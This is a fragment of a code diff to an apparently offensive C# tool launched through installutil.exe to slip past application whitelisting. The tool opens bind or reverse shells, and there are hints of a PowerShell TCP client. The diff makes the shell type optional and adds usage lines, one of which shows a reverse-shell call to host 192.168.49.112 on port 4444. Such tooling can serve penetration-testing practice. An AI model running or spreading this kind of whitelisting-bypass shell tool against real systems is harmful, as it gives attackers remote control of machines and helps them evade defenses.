@@ -108,10 +108,12 @@ $client.Close();";
         port = this.Context.Parameters["port"];
         string filename = Path.GetFileName(this.Context.Parameters["assemblypath"]);
 
-        if (shellType != "bind" && shellType != "reverse")
+        if (shellType != null && shellType != "bind" && shellType != "reverse")
         {
-            Console.WriteLine("[-] Must specify shell type : bind, reverse");
+            Console.WriteLine("[-] Must specify shell type : none, bind, reverse");
+            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U " + filename);
             Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=bind " + filename);
+            Console.WriteLine("[-] Usage : C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U /shelltype=reverse /host=192.168.49.112 /port=4444 " + filename);
             return;
         }
         else if (shellType == "reverse" && (host == null || port == null))
